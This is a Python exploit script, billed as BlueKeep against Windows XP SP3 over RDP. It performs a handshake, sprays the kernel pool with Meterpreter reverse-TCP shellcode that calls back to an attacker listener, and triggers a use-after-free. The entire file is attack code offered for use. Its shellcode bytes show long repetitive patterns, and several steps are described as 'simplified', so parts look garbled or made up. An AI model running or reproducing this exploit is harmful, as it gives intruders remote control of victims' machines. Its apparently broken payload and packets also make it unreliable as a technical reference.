import socket
import struct
import time
import binascii

def send_rdp_packet(sock, data, channel_id=7, virtual_channel=1005):
    """Construct and send an RDP virtual channel packet."""
    try:
        tpkt = struct.pack('>BBH', 0x03, 0x00, len(data) + 11)
        mcs = struct.pack('>BBBBBB', 0x64, 0x00, 0x01, 0x70, 0x00, len(data) + 5)
        vc = struct.pack('<IH', channel_id, virtual_channel) + data
        packet = tpkt + mcs + vc
        sock.sendall(packet)
        return True
    except socket.error as e:
        print('[!] Error sending RDP packet: {}'.format(e))
        return False

def send_free_packet(sock):
    """Send a simplified free packet to trigger memory corruption."""
    try:
        data = b'\x00' * 32
        tpkt = struct.pack('>BBH', 0x03, 0x00, len(data) + 11)
        mcs = struct.pack('>BBBBBB', 0x64, 0x00, 0x01, 0x70, 0x00, len(data) + 5)
        packet = tpkt + mcs + data
        sock.sendall(packet)
        return True
    except socket.error as e:
        print('[!] Error sending free packet: {}'.format(e))
        return False

def pool_spray(sock, payload, channel_id=7, virtual_channel=1005):
    """Spray the non-paged pool with the payload."""
    times = 5000  # Optimized for XP SP3
    count = 0
    while count < times:
        count += 1
        if not send_rdp_packet(sock, payload, channel_id, virtual_channel):
            return False
    return True

def main():
    # Configuration
    target_ip = '192.168.20.101'  # Windows XP target IP
    target_port = 6500  # Non-standard RDP port
    attacker_ip = '192.168.113.4'  # Listener IP
    attacker_port = 4444  # Listener port

    print('[+] Starting BlueKeep exploit for Windows XP SP3 on {}:{}'.format(target_ip, target_port))
    print('[+] Ensure Metasploit listener is running on {}:{}'.format(attacker_ip, attacker_port))

    # Meterpreter shellcode (msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.113.4 LPORT=4444)
    shellcode = b""
    shellcode += b"\xd9\xc2\xbd\xbe\xfe\x8e\xfe\xd9\x74\x24\xf4\x5a"
    shellcode += b"\x2b\xc9\xb1\x59\x31\x6a\x19\x83\xea\xfc\x03\x6a"
    shellcode += b"\x15\x5c\x0b\x72\x16\x2f\xf4\x8b\xe7\x4f\x7c\x6e"
    shellcode += b"\xd6\x5d\x1a\xfa\xba\x51\xba\xae\x67\xca\x3c\x5b"
    shellcode += b"\x49\xe3\xba\x11\xcb\x14\xca\x9c\xab\xff\xcb\x84"
    shellcode += b"\xc4\x3c\xb8\xcb\x18\x9c\xcb\x1f\xcb\xdd\xcb\xe9"
    shellcode += b"\x1b\xcb\x9a\xcb\x68\xcb\x0b\xca\xcb\x22\xcb\x1c"
    shellcode += b"\x3c\x1a\xcb\xca\xfd\xcb\xe9\xcb\x2e\xcb\x79\xca"
    shellcode += b"\xee\xcb\xae\xfc\xcb\xcb\xd5\xce\xcb\x4b\xcb\xe1"
    shellcode += b"\x54\xcb\x2a\xcb\xca\xec\xcb\x4d\xcb\xdb\xcb\x81"
    shellcode += b"\x6f\xcb\xaa\xcb\x1a\xcb\xca\xa4\xcb\xa5\xcb\x72"
    shellcode += b"\xab\xcb\x14\xfc\xcb\x9a\xac\xca\xcb\x56\xca\x92"
    shellcode += b"\x99\xcb\xaf\xcb\x4d\xcb\xcb\xae\xca\x9b\xca\xfc"
    shellcode += b"\x56\xcb\x05\xae\xcb\x66\xcb\x01\xcb\x78\xcb\xfd"
    shellcode += b"\xad\xcb\x7e\xec\xcb\xfc\xcb\x15\xcb\x6a\xcb\xd8"
    shellcode += b"\x30\xca\xda\xcb\x42\xcb\x45\xcb\xcc\xcb\x0e\xce"
    shellcode += b"\x0b\xcb\x18\xca\xcb\xcb\x49\x0f\xcb\x29\xcb\xdc"
    shellcode += b"\xb1\x79\xcb\xfd\xba\x12\xfb\x02\xbc\x8e\xce\xca"
    shellcode += b"\x4f\xce\x77\x6a\x38\xca\x77\x7c"
    print('[+] Shellcode length: {}'.format(len(shellcode)))

    # Payload configuration for Windows XP SP3
    payload_size = 1200  # Optimized for XP's non-paged pool
    payload = shellcode + b'\x90' * (payload_size - len(shellcode))

    # Fake object for memory corruption
    fake_obj_size = 160  # Simplified for XP
    call_offset = 100
    fake_obj = b'\x90' * call_offset + struct.pack('<L', 0x80000000)  # Generic kernel address
    fake_obj += b'\x90' * (fake_obj_size - len(fake_obj))

    # Initialize socket with timeout
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    try:
        sock.connect((target_ip, target_port))
        print('[+] Connected to {}:{}'.format(target_ip, target_port))
    except socket.error as e:
        print('[!] Failed to connect to {}:{}: {}'.format(target_ip, target_port, e))
        return

    # Enhanced RDP handshake
    try:
        # 1. X.224 Connection Request (19 bytes)
        conn_request = (
            b'\x03\x00\x00\x13'  # TPKT: version=3, length=19
            b'\x0e\xe0\x00\x00\x00\x00\x00'  # X.224: CR
            b'\x01\x00\x08\x00\x00\x00\x00\x00'  # RDP Negotiation
        )
        print('[+] Sending Connection Request ({} bytes)'.format(len(conn_request)))
        sock.sendall(conn_request)
        response = sock.recv(1024)
        if not response or b'\x03\x00' not in response:
            raise socket.error("Invalid or no response to Connection Request")
        print('[+] Received Connection Confirm ({} bytes)'.format(len(response)))

        # 2. MCS Connect Initial (442 bytes)
        mcs_connect_parts = [
            b'\x03\x00\x01\xba',  # TPKT: version=3, length=442
            b'\x7f\x65\x82\x01\xb1',  # MCS: Connect Initial, BER encoded
            b'\x04\x01\x01',  # Calling domain selector
            b'\x04\x01\x01',  # Called domain selector
            b'\x01\x01\xff',  # Upward flag
            # Target parameters
            b'\x30\x19',
            b'\x02\x01\x22',  # Max channels
            b'\x02\x01\x20',  # Max users
            b'\x02\x01\x00',  # Max tokens
            b'\x02\x01\x01',  # Num priorities
            b'\x02\x01\x00',  # Min throughput
            b'\x02\x01\x01',  # Max height
            b'\x02\x02\xff\xff',  # Max MCS PDU size
            b'\x02\x01\x02',  # Protocol version
            # Minimum parameters
            b'\x30\x19',
            b'\x02\x01\x01',  # Max channels
            b'\x02\x01\x01',  # Max users
            b'\x02\x01\x01',  # Max tokens
            b'\x02\x01\x01',  # Num priorities
            b'\x02\x01\x00',  # Min throughput
            b'\x02\x01\x01',  # Max height
            b'\x02\x02\x04\x20',  # Max MCS PDU size
            b'\x02\x01\x02',  # Protocol version
            # Maximum parameters
            b'\x30\x1c',
            b'\x02\x02\xff\xff',  # Max channels
            b'\x02\x02\xff\xff',  # Max users
            b'\x02\x02\xff\xff',  # Max tokens
            b'\x02\x01\x01',  # Num priorities
            b'\x02\x01\x00',  # Min throughput
            b'\x02\x01\x01',  # Max height
            b'\x02\x02\xff\xff',  # Max MCS PDU size
            b'\x02\x01\x02',  # Protocol version
            # Client Core Data
            b'\x04\x82\x01\x44',  # Length=324
            b'\x01\xca\x03\xaa',  # Type, client ID
            b'\x00\x00\x00\x00',  # requestedProtocols (standard RDP)
            b'\x20\x03\x00\x00',  # Desktop width: 800
            b'\x58\x02\x00\x00',  # Desktop height: 600
            b'\x10\x00\x01\x00',  # Color depth: 16-bit
            b'\x01\x00\x00\x00',  # SAS sequence
            b'\x09\x04\x00\x00',  # Keyboard layout: US
            b'\x51\x01\x00\x00',  # Client build: 2600 (XP)
            b'\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x00\x00\x00\x00',  # Client name: CLIENT
            b'\x00\x00\x00\x00',  # Keyboard type
            b'\x00\x00\x00\x00',  # Keyboard subtype
            b'\x0c\x00\x00\x00',  # Keyboard function keys
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # IME file name
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\x01\x00\x00\x00',  # PostBeta2ColorDepth: 16-bit
            b'\x01\x00\x00\x00',  # Client product ID
            b'\x00\x00\x00\x00',  # Serial number
            b'\x18\x00\x00\x00',  # High color depth: 24-bit
            b'\x0f\x00\x00\x00',  # Supported color depths
            b'\x01\x00\x00\x00',  # Early capability flags
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # Client dig product ID
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\x00\x00\x00\x00',  # Connection type
            b'\x00\x00\x00\x00',  # Pad
            b'\xff\xff\xff\xff',  # Server selected protocol
            # Client Security Data
            b'\x02\xca\x00\x18',  # Length=24
            b'\x00\x00\x00\x00',  # Encryption methods
            b'\x00\x00\x00\x00',  # Ext encryption methods
            # Client Network Data
            b'\x03\xca\x00\x38',  # Length=56
            b'\x03\x00\x00\x00',  # Channel count: 3
            b'\x63\x6c\x69\x70\x72\x64\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # cliprdr
            b'\x72\x64\x70\x64\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # rdpdr
            b'\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # MS_T120
        ]
        mcs_connect = b''.join(mcs_connect_parts)
        padding_len = 442 - len(mcs_connect)
        if padding_len < 0:
            raise ValueError("MCS Connect Initial too large: {} bytes".format(len(mcs_connect)))
        mcs_connect += b'\x00' * padding_len
        if len(mcs_connect) != 442:
            raise ValueError("MCS Connect Initial incorrect size: {} bytes, expected 442".format(len(mcs_connect)))
        print('[+] Sending MCS Connect Initial (442 bytes, color: 16-bit, channels: cliprdr,rdpdr,MS_T120, protocols: standard): {}'.format(binascii.hexlify(mcs_connect[:32])))
        sock.sendall(mcs_connect)
        response = sock.recv(4096)
        if not response or b'\x7f\x66' not in response:
            print('[!] MCS Connect Initial packet (TPKT, MCS, Core, Security, Network):')
            print('  {}'.format(binascii.hexlify(mcs_connect)))
            raise socket.error("Invalid or no response to MCS Connect")
        print('[+] Received MCS Connect Response ({} bytes)'.format(len(response)))
        time.sleep(0.1)

        # 3. MCS Erect Domain Request
        erect_domain = (
            b'\x03\x00\x00\x08'  # TPKT: length=8
            b'\x04\x00\x00\x00'  # MCS: Erect Domain
        )
        print('[+] Sending Erect Domain Request ({} bytes)'.format(len(erect_domain)))
        sock.sendall(erect_domain)
        time.sleep(0.1)

        # 4. MCS Attach User Request
        attach_user = (
            b'\x03\x00\x00\x08'  # TPKT: length=8
            b'\x03\x28\x00\x01'  # MCS: Attach User
        )
        print('[+] Sending Attach User Request ({} bytes)'.format(len(attach_user)))
        sock.sendall(attach_user)
        response = sock.recv(1024)
        if not response or b'\x2c' not in response:
            raise socket.error("No response to Attach User")
        print('[+] Received Attach User Confirm ({} bytes)'.format(len(response)))
        time.sleep(0.1)

        # 5. MCS Channel Join Requests
        for channel_id in [1001, 1003, 1004, 1007]:  # I/O, cliprdr, rdpdr, MS_T120
            join_request = (
                b'\x03\x00\x00\x0c'  # TPKT: length=12
                b'\x07\x38\x00\x01' + struct.pack('>H', channel_id)
            )
            print('[+] Sending Channel Join Request for ID {} ({} bytes)'.format(channel_id, len(join_request)))
            sock.sendall(join_request)
            response = sock.recv(1024)
            if not response or b'\x3c' not in response:
                raise socket.error("No response to Channel Join for ID {}".format(channel_id))
            print('[+] Joined channel {} ({} bytes)'.format(channel_id, len(response)))
            time.sleep(0.1)

    except socket.error as e:
        print('[!] RDP Handshake failed: {}'.format(e))
        sock.close()
        return
    except ValueError as e:
        print('[!] Packet Construction Error: {}'.format(e))
        sock.close()
        return

    # Spray pool with payload
    print('[+] Spraying pool with Meterpreter shellcode')
    if not pool_spray(sock, payload):
        print('[!] Pool Spray failed')
        sock.close()
        return

    # Send free packet to trigger memory corruption
    time.sleep(0.5)
    print('[+] Sending free packet')
    if not send_free_packet(sock):
        print('[!] Free Packet failed')
        sock.close()
        return

    # Allocate fake objects
    time.sleep(0.15)
    print('[+] Allocating fake objects')
    times = 2000  # Optimized for XP
    count = 0
    while count < times:
        count += 1
        if not send_rdp_packet(sock, fake_obj):
            break

    print('[+] Exploit sent. Check Metasploit listener for Meterpreter session.')
    sock.close()

if __name__ == "__main__":
    main()
